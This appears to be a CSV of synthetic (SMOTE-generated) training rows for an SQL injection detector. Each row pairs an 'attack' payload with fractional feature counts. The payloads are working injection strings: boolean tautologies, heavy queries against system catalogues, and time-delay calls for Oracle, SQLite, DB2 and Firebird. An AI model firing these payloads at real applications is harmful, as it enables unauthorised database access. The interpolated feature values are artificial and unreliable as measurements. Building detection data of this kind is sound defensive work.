id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000060,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000186,0.4143480007332143,142.0924659450377,32.42264305235738,4.061491613158739,68.97925068325083,8.711321526178688,45.26792915707213,19.133964578536066,0.48568209148823616,0.061315126679378745,0.31847408093526064,0.13452870089712443,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.711321526178688,1.0,0.0,2.711321526178688,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000061,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000108,0.3658621904411804,91.66326267052239,27.295918074502488,3.6153958884450352,32.29591807450249,8.49319679083748,36.380951014344944,14.49319679083748,0.3538466004624181,0.0920755921174309,0.3961342935691996,0.1579435138509514,3.098639358167496,1.1102230246251565e-16,0.0,0.0,1.0,1.098639358167496,0.0,6.197278716334992,1.098639358167496,1.0,1.0,2.098639358167496,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.098639358167496,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.098639358167496
SMOTE_000062,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000043,0.03444777457166108,137.53485174895502,32.01980932403537,4.213558281404418,69.25752121245982,16.0,37.23771188842446,15.039618648070743,0.5035773382334476,0.11640744044938221,0.27064166877349183,0.10937355254367842,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.039618648070743,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000063,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000207,0.006861613485946863,162.0,35.03298312661075,3.8357346984955885,47.0,24.0,64.0,27.0,0.29012345679012347,0.14814814814814814,0.3950617283950617,0.16666666666666666,1.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,12.0,0.0,2.0,1.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000064,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R000103,0.010430114010323755,83.04948873599653,22.01979549439862,3.2123330372580408,17.039590988797237,13.0,40.0,13.00989774719931,0.20515399008190432,0.15653842366265674,0.48165668819279,0.1566508980626489,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.009897747199308582,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000065,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",nearest_attack_euclidean,R000196,0.5625101524846171,123.41321922805422,28.0,4.102583277785176,84.0,3.0,24.677682690045184,11.735536538009036,0.6821020966606868,0.02436078916645308,0.19859943782963874,0.09493767634322144,0.0,3.0,0.0,0.0,1.0,0.0,0.0,2.7355365380090366,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000066,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000173,0.1733835826969316,162.42977721187378,34.714419690208196,4.0915366523029695,81.76248532423551,16.0,47.85767876083279,16.809613126805466,0.5034316455824918,0.09877573845454632,0.2942230088781553,0.10356960708480664,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.8096131268054645,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000067,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",nearest_attack_euclidean,R000202,1.2204374756611207,138.29336914083444,30.02444742840287,4.072921540936686,75.04889485680573,8.374079047338116,35.49631618935246,19.374079047338117,0.5489324447179303,0.059250185128208954,0.25170327043788443,0.14011409971597627,3.6748158094676233,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.699263237870493,0.0,5.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.6748158094676233,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6748158094676233
SMOTE_000068,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,1.0969243032689175,147.66668941227343,30.490194740454506,3.8207825232633787,61.8529552252277,15.264707889318244,54.54902629772748,16.0,0.41663476379325354,0.1035428436389907,0.3702525644149801,0.1095698281527756,0.0,0.9803894809090102,0.0,0.0,1.0,1.7549026297727475,0.0,8.0,0.0,0.24509737022725253,1.7549026297727477,2.7549026297727477,0.0,0.2450973702272524,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000069,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000093,0.8609472778477208,85.57407848316785,29.41582531665162,3.766169793354281,21.95538860828068,16.0,34.494951899909736,13.123737974977434,0.2556083646530736,0.18987806588032832,0.4008882907502046,0.15362527871639348,0.0,4.0,1.0,0.0,0.2920873416741888,1.0,0.0,5.415825316651622,0.0,0.7079126583258112,0.7079126583258112,2.292087341674189,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000070,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000063,1.1139682110213314,75.31661199596451,27.211074663976344,3.8447051955602127,20.422149327952685,16.0,26.89446266801183,12.0,0.26946740734992186,0.21277318519668229,0.3581795185558841,0.15957988889751173,4.0,1.1102230246251565e-16,1.0,0.0,0.0,1.4472313340059142,0.0,4.0,0.0,0.5527686659940858,1.0,2.447231334005914,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000071,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000114,1.380414982635475,163.54018367278522,34.640038667954784,3.883484549186465,49.640038667954784,21.280077335909564,61.980029000966084,30.640038667954784,0.30382770573588885,0.12920330108912273,0.37968731432718217,0.18728167884780622,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,2.0,1.0,10.640038667954782,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.6600096669886955,0.0,0.6600096669886955,0.0,0.33999033301130444,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6600096669886955
SMOTE_000072,attack,boolean,"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000172,0.5317431036669145,145.2138131992716,30.0,4.0340242771146695,84.21381319927163,8.0,38.0,15.0,0.5799264338760307,0.05509161522937303,0.2616851723395219,0.10329677855507442,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.21381319927162823,0.7861868007283719,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000073,attack,boolean,"-3649""   )    )    as eydu where 3220  =  3220 or elt  (  8705  =  1510,1510  )  --",nearest_attack_euclidean,R000175,0.4889381701159282,79.97466254955286,28.09239876486586,3.7635157074459085,15.394932509910571,24.0,29.579730039642286,11.0,0.19247149653898857,0.3011401384404574,0.3683658015686777,0.1380225634518763,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.6974662549552857,0.0,0.3025337450447142,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000074,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000026,1.2854731157160988,153.58234567215572,34.283530865568856,4.015988275236322,57.984716058982,15.850592596706573,55.59762961317371,24.149407403293427,0.3779363282366232,0.10335942655514765,0.3615601804466554,0.1571440647615737,4.0,4.0,0.28353086556885765,0.0,0.0,2.0,0.0,7.4329382688622845,1.4329382688622845,0.0,0.0,6.283530865568858,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.7164691344311425,0.28353086556885765,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000075,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000063,0.7301102796699883,83.21892192861694,28.627219862241645,3.8799814141065303,24.0,16.0,30.473361653100238,12.745560275516706,0.2902377193022845,0.19349181286818964,0.3630476921401586,0.15322277568936732,4.0,1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,4.745560275516706,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000076,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,1.5139435880048775,64.10517652574677,23.105176525746764,3.4712914168466957,24.894823474253236,4.0,25.657764788620145,9.552588262873382,0.38867870310342806,0.062412525982176545,0.39997922956413845,0.14892954135025696,0.0,0.894823474253235,2.0,0.0,1.0,2.0,0.0,1.5525882628733827,0.0,0.0,0.0,5.552588262873383,0.0,0.4474117371266173,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.4474117371266175,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.447411737126617
SMOTE_000077,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000042,0.30745168363237346,148.36765784054273,31.736765784054274,3.8334726330893187,47.0,16.0,57.894126272434185,27.473531568108548,0.31706918798997186,0.10793844697530958,0.3898339014938236,0.18515846354089494,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,11.473531568108546,0.0,2.0,1.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000078,attack,boolean,"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000071,0.11769607563982817,129.57728455315635,32.74637073189381,4.277363642539837,71.0,8.91545691063127,32.83091382126254,16.83091382126254,0.5480007874908246,0.0687885438402251,0.2533519019390751,0.12985876672987523,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.0,1.0,0.0,2.91545691063127,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000079,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000167,0.6188426639116535,94.9099406524737,29.436023739010526,3.5375519405566807,20.0,16.0,43.127952521978955,15.781988130494739,0.21127202556310806,0.16901762045048646,0.4535138780765028,0.16619647590990272,4.0,1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,6.781988130494738,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000080,attack,boolean,"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000223,0.8040762717157607,140.76094712380942,31.880473561904708,4.054174717164189,72.0,8.626824520634903,42.2536490412698,17.880473561904708,0.5117253742578594,0.06124176317372805,0.30016594796476836,0.12686691460364424,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.0,0.6268245206349026,0.0,2.626824520634903,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000081,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000231,0.37439246264187437,124.41929118938316,31.0,3.7466871007264757,42.16141762123368,15.0,48.83858237876632,18.41929118938316,0.3390868361825542,0.1205714864011626,0.39238018131783214,0.14796149609845105,6.0,1.1102230246251565e-16,0.0,1.0,0.0,2.0,0.0,8.20964559469158,0.2096455946915805,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000082,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000236,0.04065468695143238,116.21108333589855,27.090464286813667,4.096217103255921,73.21108333589855,3.0301547622712217,26.939690475457553,13.030154762271223,0.6299464944942275,0.026062847099507028,0.23186885653797415,0.11212180186829132,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,2.969845237728778,0.0,0.0,2.030154762271222,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000083,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",nearest_attack_euclidean,R000196,0.5664101876893495,123.44381727198206,28.0,4.102131057954796,84.0,3.0,24.703181059985052,11.74063621199701,0.681937221704632,0.024354900775165417,0.19875286313596752,0.09495501438423515,0.0,3.0,0.0,0.0,1.0,0.0,0.0,2.7406362119970105,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000084,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R000247,0.35695874338240013,68.54793278221493,18.591322130369157,3.0593585967916077,14.591322130369154,9.788429507158874,33.57685901431775,10.591322130369157,0.21330210927210122,0.1420419875672646,0.4902617213901345,0.15439418177049968,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,4.394214753579437,0.0,0.0,0.19710737678971868,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000085,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000127,1.729242920664172,118.11940939420563,29.576118121158874,3.627483981461133,37.96717315188788,13.0,49.0,18.15223624231775,0.32096129643928445,0.11010599015925669,0.41501488598489056,0.15391782741656826,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,8.0,1.152236242317749,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.5761181211588746,0.4238818788411254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000086,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",nearest_attack_euclidean,R000280,0.9962440934169604,143.88346170215192,31.269291489360427,3.5401917264306055,43.76850212767491,17.154331914883397,63.307085106395746,19.653542553197877,0.3029935011369344,0.12120513834720428,0.4396720293500743,0.13612933116578693,4.922834042558301,1.1102230246251565e-16,0.0,1.0,0.0,1.2692914893604248,0.0,11.46141702127915,0.0,0.0,1.0,2.269291489360424,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000087,attack,boolean,"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",nearest_attack_euclidean,R000302,0.9603194367871808,84.756100716274,27.648779856745197,3.853931912153553,20.324389928372597,23.026830214882203,30.053660429764406,11.351220143254801,0.24088349349815102,0.2715930422084874,0.35380636580689095,0.13371709848647062,0.0,1.0,2.6756100716274007,0.0,0.0,2.0,0.0,3.675610071627401,0.0,1.0,1.0,4.675610071627401,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.32438992837259906,0.6756100716274009,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000088,attack,boolean,1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,nearest_attack_euclidean,R000174,1.0422986483375902,62.21169462471766,21.61559283295687,3.4435220591529663,9.211694624717659,21.0,24.0,8.0,0.14759728870646405,0.3377444705125331,0.3859936805857521,0.12866456019525072,0.0,1.1102230246251565e-16,2.0,0.0,0.596101791760782,2.0,0.0,3.0,0.0,0.0,0.40389820823921785,4.596101791760782,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000089,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000064,1.249958981641718,138.49833826457873,30.221852947684162,3.651124493205306,52.64734805331569,10.0,56.22185294768416,19.629137263578887,0.3795667470799835,0.0726041643493521,0.40695948484446254,0.1408696037262018,4.592715684105278,1.1102230246251565e-16,0.0,0.7963578420526394,0.0,0.0,0.0,11.40728431589472,0.0,0.40728431589472125,1.0,2.018210789736803,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.2036421579473607,1.0,0.0,0.0,0.20364215794736074,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.203642157947361
